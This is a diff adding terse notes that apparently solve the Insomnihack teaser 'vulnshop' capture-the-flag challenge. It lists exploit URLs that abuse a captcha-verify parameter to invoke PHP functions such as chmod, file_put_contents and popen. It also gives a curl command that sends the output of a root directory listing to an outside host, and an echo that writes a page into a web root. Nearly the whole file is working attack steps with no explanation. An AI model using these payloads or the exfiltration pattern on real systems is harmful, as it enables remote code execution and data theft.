@@ -1,0 +1,11 @@
+http://vulnshop.teaser.insomnihack.ch/?page=contactus
+http://vulnshop.teaser.insomnihack.ch/?page=captcha
+http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&answer=1023&method=chmod
+http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=file_put_contents&answer=
+curl -G  http://terjanq.cf/ctf/bear/fetch.php? --data-urlencode "log=$(ls -la /)"
+http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=popen&answer=r
+
+
+
+
+echo '<h1>Hello World!</h1><span>terjanq.cf</span>' > /var/www/terjanq.cf/public_html/index.html
